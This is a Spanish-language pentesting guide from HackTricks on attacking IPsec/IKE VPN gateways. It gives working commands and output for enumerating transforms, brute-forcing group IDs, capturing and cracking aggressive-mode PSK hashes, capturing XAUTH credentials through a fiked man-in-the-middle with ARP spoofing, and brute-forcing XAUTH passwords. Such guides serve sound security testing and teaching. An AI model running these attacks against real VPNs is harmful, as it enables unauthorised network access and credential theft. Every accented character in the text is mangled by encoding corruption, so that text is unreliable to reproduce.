# 500/udp - Pentesting IPsec/IKE VPN

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Grupo de Seguridad Try Hard**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Informaci칩n B치sica

**IPsec** es ampliamente reconocido como la tecnolog칤a principal para asegurar comunicaciones entre redes (LAN a LAN) y desde usuarios remotos hasta la puerta de enlace de la red (acceso remoto), sirviendo como la columna vertebral de las soluciones de VPN empresariales.

El establecimiento de una **asociaci칩n de seguridad (SA)** entre dos puntos es gestionado por **IKE**, que opera bajo el paraguas de ISAKMP, un protocolo dise침ado para la autenticaci칩n e intercambio de claves. Este proceso se desarrolla en varias fases:

- **Fase 1:** Se crea un canal seguro entre dos puntos. Esto se logra mediante el uso de una Clave Precompartida (PSK) o certificados, empleando ya sea modo principal, que implica tres pares de mensajes, o **modo agresivo**.
- **Fase 1.5:** Aunque no es obligatoria, esta fase, conocida como Fase de Autenticaci칩n Extendida, verifica la identidad del usuario que intenta conectarse al requerir un nombre de usuario y contrase침a.
- **Fase 2:** Esta fase se dedica a negociar los par치metros para asegurar los datos con **ESP** y **AH**. Permite el uso de algoritmos diferentes a los de la Fase 1 para garantizar **Secreto Directo Perfecto (PFS)**, mejorando la seguridad.


**Puerto predeterminado:** 500/udp

## **Descubre** el servicio usando nmap
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## Encontrar una transformaci칩n v치lida

La configuraci칩n de IPSec puede estar preparada para aceptar solo una o unas pocas transformaciones. Una transformaci칩n es una combinaci칩n de valores. **Cada transformaci칩n** contiene un n칰mero de atributos como DES o 3DES como el algoritmo de **encriptaci칩n**, SHA o MD5 como el algoritmo de **integridad**, una clave precompartida como el tipo de **autenticaci칩n**, Diffie-Hellman 1 o 2 como el algoritmo de **distribuci칩n de clave** y 28800 segundos como el **tiempo de vida**.

Entonces, lo primero que debes hacer es **encontrar una transformaci칩n v치lida**, para que el servidor pueda comunicarse contigo. Para hacerlo, puedes usar la herramienta **ike-scan**. Por defecto, Ike-scan funciona en modo principal, y env칤a un paquete al gateway con un encabezado ISAKMP y una sola propuesta con **ocho transformaciones dentro**.

Dependiendo de la respuesta, puedes obtener informaci칩n sobre el punto final:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
Como puedes ver en la respuesta anterior, hay un campo llamado **AUTH** con el valor **PSK**. Esto significa que la VPN est치 configurada utilizando una clave precompartida (lo cual es realmente bueno para un pentester).\
**El valor de la 칰ltima l칤nea tambi칠n es muy importante:**

* _0 returned handshake; 0 returned notify:_ Esto significa que el objetivo **no es una puerta de enlace IPsec**.
* _**1 returned handshake; 0 returned notify:**_ Esto significa que el **objetivo est치 configurado para IPsec y est치 dispuesto a realizar la negociaci칩n IKE, y uno o m치s de los transformadores que propusiste son aceptables** (se mostrar치 un transformador v치lido en la salida).
* _0 returned handshake; 1 returned notify:_ Las puertas de enlace VPN responden con un mensaje de notificaci칩n cuando **ninguno de los transformadores es aceptable** (aunque algunas puertas de enlace no lo hacen, en cuyo caso se debe intentar un an치lisis adicional y una propuesta revisada).

Entonces, en este caso ya tenemos una transformaci칩n v치lida, pero si te encuentras en el tercer caso, entonces necesitas **probar un poco para encontrar una transformaci칩n v치lida:**

En primer lugar, necesitas crear todas las posibles transformaciones:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
Y luego realizar fuerza bruta en cada uno utilizando ike-scan (esto puede llevar varios minutos):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
Si el ataque de fuerza bruta no funcion칩, tal vez el servidor est칠 respondiendo sin realizar apretones de manos incluso a transformaciones v치lidas. En ese caso, podr칤as intentar el mismo ataque de fuerza bruta pero utilizando el modo agresivo:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Con suerte, **una transformaci칩n v치lida se refleja**.\
Puedes intentar el **mismo ataque** usando [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py).\
Tambi칠n podr칤as intentar forzar transformaciones con [**ikeforce**](https://github.com/SpiderLabs/ikeforce):
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (109).png>)

En **Grupo DH: 14 = MODP de 2048 bits** y **15 = 3072 bits**\
**2 = HMAC-SHA = SHA1 (en este caso). El formato `--trans` es $Enc,$Hash,$Auth,$DH**

Cisco indica evitar el uso de los grupos DH 1 y 2 porque no son lo suficientemente fuertes. Los expertos creen que **los pa칤ses con muchos recursos pueden romper f치cilmente** la encriptaci칩n de datos que utiliza estos grupos d칠biles. Esto se logra utilizando un m칠todo especial que los prepara para descifrar los c칩digos r치pidamente. Aunque cuesta mucho dinero configurar este m칠todo, permite a estos pa칤ses poderosos leer los datos encriptados en tiempo real si se est치 utilizando un grupo que no es fuerte (como 1,024 bits o menos).

### Identificaci칩n del servidor

Luego, puedes usar ike-scan para intentar **descubrir el proveedor** del dispositivo. La herramienta env칤a una propuesta inicial y deja de retransmitir. Luego, **analiza** la **diferencia de tiempo** entre los **mensajes recibidos** del servidor y el patr칩n de respuesta coincidente, el pentester puede identificar con 칠xito el proveedor de la puerta de enlace VPN. Adem치s, algunos servidores VPN utilizar치n el **carga 칰til de ID de proveedor (VID) opcional** con IKE.

**Especificar la transformaci칩n v치lida si es necesario** (usando --trans)

Si IKE descubre cu치l es el proveedor, lo imprimir치:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Esto tambi칠n se puede lograr con el script de nmap _**ike-version**_

## Encontrar el ID correcto (nombre de grupo)

Para poder capturar el hash necesitas una transformaci칩n v치lida que admita el modo Agresivo y el ID correcto (nombre de grupo). Probablemente no sepas el nombre de grupo v치lido, por lo que tendr치s que probarlo por fuerza bruta.\
Para hacerlo, te recomendar칤a 2 m칠todos:

### Fuerza bruta del ID con ike-scan

En primer lugar, intenta hacer una solicitud con un ID falso para intentar recopilar el hash ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
Si **no se devuelve ning칰n hash**, entonces probablemente este m칠todo de fuerza bruta funcionar치. **Si se devuelve alg칰n hash, esto significa que se enviar치 un hash falso para un ID falso, por lo que este m칠todo no ser치 confiable** para realizar fuerza bruta en el ID. Por ejemplo, podr칤a devolverse un hash falso (esto ocurre en versiones modernas):

![](<../.gitbook/assets/image (110).png>)

Pero como he mencionado, si no se devuelve ning칰n hash, entonces debes intentar realizar fuerza bruta en nombres de grupo comunes utilizando ike-scan.

Este script **intentar치 realizar fuerza bruta en posibles IDs** y devolver치 los IDs donde se devuelva un handshake v치lido (esto ser치 un nombre de grupo v치lido).

Si has descubierto una transformaci칩n espec칤fica, agr칠gala en el comando ike-scan. Y si has descubierto varias transformaciones, si칠ntete libre de agregar un nuevo bucle para probarlas todas (debes probarlas todas hasta que una de ellas funcione correctamente).

Puedes utilizar el [diccionario de ikeforce](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) o [el de seclists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) de nombres de grupo comunes para realizar fuerza bruta en ellos:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
### Fuerza bruta de ID con Iker

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) tambi칠n utiliza **ike-scan** para realizar fuerza bruta de posibles nombres de grupo. Sigue su propio m칠todo para **encontrar un ID v치lido basado en la salida de ike-scan**.

### Fuerza bruta de ID con ikeforce

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) es una herramienta que se puede utilizar para **realizar fuerza bruta de IDs tambi칠n**. Esta herramienta **intentar치 explotar diferentes vulnerabilidades** que podr칤an ser utilizadas para **distinguir entre un ID v치lido y uno no v치lido** (puede haber falsos positivos y falsos negativos, por eso prefiero usar el m칠todo de ike-scan si es posible).

Por defecto, **ikeforce** enviar치 al principio algunos IDs aleatorios para verificar el comportamiento del servidor y determinar la t치ctica a utilizar.

* El **primer m칠todo** es realizar fuerza bruta de los nombres de grupo **buscando** la informaci칩n de **Dead Peer Detection DPD** de los sistemas Cisco (esta informaci칩n solo es respondida por el servidor si el nombre del grupo es correcto).
* El **segundo m칠todo** disponible es **verificar el n칰mero de respuestas enviadas en cada intento** porque a veces se env칤an m치s paquetes cuando se utiliza el ID correcto.
* El **tercer m칠todo** consiste en **buscar "INVALID-ID-INFORMATION" en respuesta a un ID incorrecto**.
* Finalmente, si el servidor no responde a las verificaciones, **ikeforce** intentar치 realizar fuerza bruta en el servidor y verificar si cuando se env칤a el ID correcto, el servidor responde con alg칰n paquete.\
Obviamente, el objetivo de la fuerza bruta del ID es obtener la **PSK** cuando se tiene un ID v치lido. Luego, con el **ID** y la **PSK**, deber치s realizar fuerza bruta en el XAUTH (si est치 habilitado).

Si has descubierto una transformaci칩n espec칤fica, agr칠gala en el comando de ikeforce. Y si has descubierto varias transformaciones, si칠ntete libre de agregar un nuevo bucle para probarlas todas (deber칤as probarlas todas hasta que una de ellas funcione correctamente).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

(From the book **Network Security Assessment: Know Your Network**): Tambi칠n es posible obtener nombres de usuario v치lidos al husmear la conexi칩n entre el cliente VPN y el servidor, ya que el primer paquete de modo agresivo que contiene el ID del cliente se env칤a en texto claro

![](<../.gitbook/assets/image (111).png>)

## Capturando y descifrando el hash

Finalmente, si has encontrado una **transformaci칩n v치lida** y el **nombre del grupo** y si el **modo agresivo est치 permitido**, entonces puedes capturar f치cilmente el hash que se puede descifrar:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
El hash se guardar치 dentro de _hash.txt_.

Puedes usar **psk-crack**, **john** (usando [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)) y **hashcat** para **descifrar** el hash:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**El modo Aggressive IKE** combinado con una **Clave Precompartida (PSK)** se emplea com칰nmente para fines de **autenticaci칩n de grupo**. Este m칠todo se ve reforzado por **XAuth (Autenticaci칩n Extendida)**, que sirve para introducir una capa adicional de **autenticaci칩n de usuario**. Esta autenticaci칩n suele aprovechar servicios como **Microsoft Active Directory**, **RADIUS**, u otros sistemas comparables.

Al pasar a **IKEv2**, se observa un cambio notable donde se utiliza **EAP (Protocolo de Autenticaci칩n Extensible)** en lugar de **XAuth** con el fin de autenticar a los usuarios. Este cambio destaca una evoluci칩n en las pr치cticas de autenticaci칩n dentro de los protocolos de comunicaci칩n segura.


### Ataque Man-in-the-Middle en la red local para capturar credenciales

As칤 puedes capturar los datos del inicio de sesi칩n utilizando _fiked_ y ver si hay alg칰n nombre de usuario predeterminado (Necesitas redirigir el tr치fico IKE a `fiked` para el espionaje, lo cual se puede hacer con la ayuda de ARP spoofing, [m치s informaci칩n](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked actuar치 como un punto final de VPN y capturar치 las credenciales de XAuth:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
### Ataque de MitM y bloqueo de tr치fico al puerto 500 usando IPSec

Tambi칠n, utilizando IPSec, intenta realizar un ataque de MitM y bloquear todo el tr치fico al puerto 500. Si el t칰nel IPSec no puede establecerse, es posible que el tr치fico se env칤e en texto claro.

### Fuerza bruta de nombre de usuario y contrase침a XAUTH con ikeforce

Para realizar fuerza bruta en el **XAUTH** (cuando se conoce un nombre de grupo v치lido **id** y el **psk**), puedes usar un nombre de usuario o una lista de nombres de usuario y una lista de contrase침as:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
De esta manera, ikeforce intentar치 conectarse utilizando cada combinaci칩n de nombre de usuario: contrase침a.

Si encontraste uno o varios transformados v치lidos, simplemente 칰salos como en los pasos anteriores.

## Autenticaci칩n con una VPN IPSEC

En Kali, **VPNC** se utiliza para establecer t칰neles IPsec. Los **perfiles** deben estar ubicados en el directorio `/etc/vpnc/`. Puedes iniciar estos perfiles utilizando el comando _**vpnc**_.

Los siguientes comandos y configuraciones ilustran el proceso de configuraci칩n de una conexi칩n VPN con VPNC:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
En esta configuraci칩n:

- Reemplace `[VPN_GATEWAY_IP]` con la direcci칩n IP real del gateway VPN.
- Reemplace `[VPN_CONNECTION_ID]` con el identificador de la conexi칩n VPN.
- Reemplace `[VPN_GROUP_SECRET]` con el secreto de grupo de la VPN.
- Reemplace `[VPN_USERNAME]` y `[VPN_PASSWORD]` con las credenciales de autenticaci칩n de la VPN.
- `[PID]` simboliza el ID de proceso que se asignar치 cuando `vpnc` se inicie.

Aseg칰rese de utilizar valores reales y seguros para reemplazar los marcadores de posici칩n al configurar la VPN.

## Material de Referencia

* [Documento de cracking de PSK](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [Escaneo de una Implementaci칩n de VPN](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* Evaluaci칩n de Seguridad de Red 3ra Edici칩n

## Shodan

* `port:500 IKE`

**Grupo de Seguridad Try Hard**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n la [**oficial mercanc칤a de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
